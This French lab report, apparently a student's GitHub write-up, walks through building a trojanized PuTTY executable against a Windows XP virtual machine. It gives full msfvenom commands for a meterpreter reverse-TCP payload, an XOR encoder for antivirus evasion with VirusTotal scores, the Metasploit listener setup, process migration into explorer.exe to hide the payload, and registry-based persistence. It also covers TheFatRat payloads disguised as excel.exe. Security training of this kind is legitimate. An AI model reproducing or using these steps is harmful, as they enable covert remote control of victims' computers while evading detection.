# <center>Camouflage malware</center>

    Utilitaires : 
    - VirtualBox 7
    - VM Kali 5
    - VM Kali 6
    - VM Windows XP
    - Framework Metasploit
    - Encrypter bf_xor
    - Exécutable PuTTY
    - Site virustotal.com
    - Framework TheFatRat
    - Document écrit avec l'extension markdown (.md) pour faciliter la lecture des commandes

# <center> Objectif 1 </center>

J'ai créé une payload avec `msfvenom`, son injection dans un binaire existant sera effectuée dès sa création avec un mécanisme d'offuscation. L'idée est de donner les caractéristiques de l'exécutable sain à la payload (icône, propriétés).   
* Détails dans la *section 1. de l'objectif 2* et screenshots dans la *section 2. de l'objectif 3*.

Par la suite, le terme "injection de la payload" prendra un autre sens, en la rendant **invisible** pour l'utilisateur de la machine cible, grâce à la migration de son PID.  
* Détails et screenshots dans la *section 3. de l'objectif 3*.  

Puis en la rendant **persistante** pour répéter et maintenir le contrôle de l'attaquant..  
* Détails et screenshots dans la *section 4. de l'objectif 3*.  


---

# <center> Objectif 2 </center>

## 1. Commande `msfvenom` & mécanismes d'offuscation

La payload est créée à partir de la commande suivante :
```bash
$msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.56.106 lport=1234 -f raw -x putty.exe -k -f exe-only -e x86/bf_xor -o putty_msf.exe
```

Screentshot associé et explications des paramètres :<center>
![alt text](https://github.com/Eninox/cyber_camouflage_malware/blob/main/media/payloadFirst1.png)</center> 

* `-p windows/meterpreter/reverse_tcp` indique l'appel de la payload à exploiter dans le framework metasploit  
* `lhost` indique l'IP de la machine attaquante, celle qui recevra le signal d'activation de la backdoor  
* `lport` indique le port par lequel le signal passera pour que la machine cible contacte l'attaquante
* `-x putty.exe -k` identifie l'exécutable sain sur lequel la payload s'appuiera, notamment pour copier  son icône et ses propriétés afin de la confondre et faciliter le premier clic de l'utilisateur  
* `-f exe-only` renvoie au mode d'insertion de la payload, elle sera exécutée dans la section exécutable du binaire directement et n'aura pas de zone mémoire allouée  
* `-e x86/bf_xor` renvoie à l'utilisation d'un "encrypter", mécanisme d'offuscation efficace pour échapper les outils d'analyse antiviral. Détails d'installation dans la *section 2. ci-après*.  
* `-o putty_msf.exe` correspond à l'output de la commande, je lui indique de créer un fichier exécutable "putty_msf"  


## 2. Intégration de l'encrypter `bf_xor`

Mon choix s'est tourné vers `bf_xor` car il introduit le chiffrement d'une partie de l'exécutable, son déchiffrement s'effectue au moment de l'attaque en testant les combinaisons possibles de caractères de manière incrémentale (force brute).
Pour intégrer cet encrypter et l'utiliser pour ma payload, j'ai copié un script Ruby dans le dossier `metasploit/modules/encoders/x86/` de la machine Kali 5

Pour identifier l'endroit exact où le script doit être : 
```bash
$whereis metasploit-framework
    metasploit-framework: /usr/share/metasploit-framework
```

Créer le fichier script `bf_xor.rb` dans la bonne arborescence, qui sera interrogée par la commande `msfvenom -e` pour de la création de la payload :
```bash
$ls /usr/share/metasploit-framework/modules/encoders/
$sudo nano /usr/share/metasploit-framework/modules/encoders/x86/bf_xor.rb
```  
Screenshot du chemin et du script : <center>
![alt text](https://github.com/Eninox/cyber_camouflage_malware/blob/main/media/payloadFirst4.png)</center> 

## 3. Score virustotal de "putty_msf.exe"

Identifiant sha256 de mon fichier "putty_msf.exe" : <center>
![alt text](https://github.com/Eninox/cyber_camouflage_malware/blob/main/media/virusTotal1.png)</center> 

Screentshot de virustotal (version light proposée par virustotal depuis Internet Explorer sur la machine XP). Score de détection de **17/74** :<center>
![alt text](https://github.com/Eninox/cyber_camouflage_malware/blob/main/media/virusTotal2.png)</center> 
* Le site virustotal détecte "PuTTY" comme nom, à l'identique de l'exécutable sain grâce au trompe l'oeil du paramètre `-x putty.exe -k` précédemment décrit.   

---

# <center> Objectif 3 </center>

## 1. Mise en écoute

Depuis la machine attaquante (Kali 5)  
Lancer metasploit framework et activer l'écoute d'une payload reverse_tcp avec l'IP de la machine attaquante et le port utilisé par la payload précédemment créée :

```bash
$msfconsole
$msf5 > use multi/handler
$msf5 > set payload windows/meterpreter/reverse_tcp
$msf5 > set LHOST 192.168.56.104
$msf5 > set LPORT 1234
$msf5 > exploit
```

Screenshot associé :<center>
![alt text](https://github.com/Eninox/cyber_camouflage_malware/blob/main/media/attaque1ecoute.jpg)</center> 



## 2. Lancement attaque

Depuis la machine cible (VM Windows XP)

Screenshots de l'icône présente sur le Bureau de l'utilisateur Loizo :<center>
![alt text](https://github.com/Eninox/cyber_camouflage_malware/blob/main/media/attaque2puttyIcon.jpg) ![alt text](https://github.com/Eninox/cyber_camouflage_malware/blob/main/media/attaque3puttyProprietes.jpg)  ![alt text](https://github.com/Eninox/cyber_camouflage_malware/blob/main/media/attaque4puttySignature.jpg) </center> 

* Comme vu précédemment, l'icône et la description de putty sont récupérées à partir de l'option ```-x putty.exe -k``` utilisée lors de la génération de la payload avec ```$msfvenom```, attention l'exécutable sain doit être préalablement présent sur la machine attaquante

Lancer l'exécutable ```putty_msf.exe```  

>Le ```_msf``` est utilisé pour le TP, dans une situation réelle, la payload serait confondue avec l'exécutable sain ```putty.exe```

Screenshot de la connexion établie :<center>
![alt text](https://github.com/Eninox/cyber_camouflage_malware/blob/main/media/attaque5connexionEtablie.jpg)</center> 

## 3. Rendre invisible la payload pour l'utilisateur

Une fois la connexion établie, afficher les processus de la machine cible avec ```$meterpreter ps``` en identifiant le PID d'un processus système (explorer.exe pour l'exemple) qu'on utilisera pour migrer le PID de la payload : <center>
![alt text](https://github.com/Eninox/cyber_camouflage_malware/blob/main/media/attaque6grepExplorer.jpg) ![alt text](https://github.com/Eninox/cyber_camouflage_malware/blob/main/media/attaque7grepPutty.jpg)</center> 

Migrer avec ```$meterpreter migrate``` le processus de la payload (PID 1736) dans celui du système (PID 408) :<center>
![alt text](https://github.com/Eninox/cyber_camouflage_malware/blob/main/media/attaque8migrate.jpg) </center> 

Alternative 1 :  
Utiliser les commandes ```set prependmigrateprocess explorer.exe``` et ```set prependmigrate true``` au moment de la mise en écoute.  
Alternative 2 :  
Utiliser l'option ```prependmigrateprocess=explorer.exe prependmigrate=true``` directement à la création de la payload avec ```$msfvenom``` (non réalisé pour le TP).

## 4. Injecter la payload dans un processus système
Afin de rendre pérenne et automatique la connexion à la machine cible, utiliser un nouvel exploit `persistence_exe` avec `msf`. Les bonnes options permettront d'injecter la payload dans un processus système, rendant transparente la connexion à la machine attaquante et ne nécessitera plus d'action de l'utilisateur. 


Durant une session active (session 4 pour l'exemple à suivre), mettre celle-ci en arrière plan :
```bash
$meterpreter > background
```
Utiliser les commandes suivantes pour identifier la session à pérenniser, identifier l'exécutable qui sera visible sur la machine cible (déguisé) et celui qui sera réellement lancé depuis la machine attaquante, puis typer le lancement en tant que système :
```bash
$msf5 > use post/windows/manage/persistence_exe
$msf5 > set session 4
$msf5 > set rexename putty.exe
$msf5 > set rexepath /home/kali/putty_msf.exe
$msf5 > set startup system
$msf5 > exploit 
```

Screenshots de la création de l'exploit : <center>
![alt text](https://github.com/Eninox/cyber_camouflage_malware/blob/main/media/persistExe1.png)</center>

* La commande `show options` liste les paramètres requis ou non pour utiliser l'exploit. On voit qu'il n'est pas nécessaire d'utiliser le LPORT/LHOST puisqu'on identifie une session active existante.
<center>

![alt text](https://github.com/Eninox/cyber_camouflage_malware/blob/main/media/persistExe2.png)</center>

* L'exploit crée un script de lancement de la payload, qui sera exécuté au démarrage de la machine cible avec la clé de registre présente dans `HKLM\Software\Microsoft\Windows\CurrentVersion\Run\zZ...`, cela ouvrira une nouvelle session.  
* Vérification :
<center>

![alt text](https://github.com/Eninox/cyber_camouflage_malware/blob/main/media/persistExe4.png)</center>
<center>

![alt text](https://github.com/Eninox/cyber_camouflage_malware/blob/main/media/persistExe3.png)</center>

* La session 5 correspond bien à la machine cible !  
* Un redémarrage de la machine cible fermera la session 5 et ouvrira une session 6 automatiquement (écoute active côté attaquant)


---

# <center> Objectif annexe </center>

## 1. Utilisation de TheFatRat

Après quelques recherches d'alternatives ou de compléments au framework metasploit, j'ai identifié TheFatRat, qui semble prendre en charge un panel de création de payload plus élargi.  
Son utilisation contraint à faire tourner plusieurs outils annexes et j'ai dû monter une VM Kali 6 en complément, je n'arrivais pas à récupérer certains paquets avec la VM initiale.  

## 2. Installation

Pour l'installer, il faut cloner le repository github concerné, j'ai choisi de le placer au même endroit que les fichiers de metasploit-framework :
```bash
$cd /usr/share/
$git clone https://github.com/Screetsec/TheFatRat.git
```

L'installation du framework et de ses pré requis s'effectue grâce à un script, il faut lui donner le droit d'exécution puis le lancer : 
```bash
$chmod +x setup.sh
$setup.sh
```

Le script installe un certain nombre d'outils nécessaires à TheFatRat, toutefois certains sont à installer soi-même. Pour cela, un autre script permet de vérifier les outils manquants :
```bash
$chmod +x chk_tools
$chk_tools
```
Pour mon installation, j'ai dû télécharger les outils suivants : 
```bash
$apt-get install mono-mcs mono-devel gnome-terminal lib32z1 backdoor-factory default-jdk default-jre mingw-w64-x86-64-dev
```

Exemple de résultat d'un chk_tools avec quasiment tous les outils nécessaires à son fonctionnement : 
<center>

![alt text](https://github.com/Eninox/cyber_camouflage_malware/blob/main/media/theFatRat1.png)</center>

Une fois le chk_tools complet (prérequis), nous pouvons lancé TheFatRat avec la commande `fatrat`, voici la première fenêtre qui s'affiche :
<center>

![alt text](https://github.com/Eninox/cyber_camouflage_malware/blob/main/media/theFatRat2.png)</center>
* On comprend les enjeux entre virustotal et les frameworks de hacking !

Ensuite le menu principal s'affiche : 
<center>

![alt text](https://github.com/Eninox/cyber_camouflage_malware/blob/main/media/theFatRat3.png)</center>

## 2. Génération de payload

J'ai effectué plusieurs générations de payload, sans tenter d'effectuer des compléments de chiffrement ou encodage.

Voici les screenshots de celle que j'ai retenu pour finaliser le mémoire et ayant eu un bon score virustotal :<center>

![alt text](https://github.com/Eninox/cyber_camouflage_malware/blob/main/media/payloadBest1.png)</center>

Choix 1 incluant une couche powershell (ne serait donc pas utile pour une attaque sur une machine Windows XP). Saisie des LPORT et LHOST souhaités et choix de l'architecture 32/64 bits : <center>

![alt text](https://github.com/Eninox/cyber_camouflage_malware/blob/main/media/payloadBest2.png)</center>

Choix d'une icône qui servira de mécanisme d'offuscation :<center>

![alt text](https://github.com/Eninox/cyber_camouflage_malware/blob/main/media/payloadBest3.png)</center>

J'ai manqué le screenshot de génération de la payload `excel.exe` qui génère et affiche le fichier cible, voici toutefois le fichier final :<center>

![alt text](https://github.com/Eninox/cyber_camouflage_malware/blob/main/media/payloadBest5.png)</center>

Score virustotal associé à cette payload `excel.exe` :<center>

![alt text](https://github.com/Eninox/cyber_camouflage_malware/blob/main/media/payloadBest4.png)</center>


Fin des investigations ! 

--- 
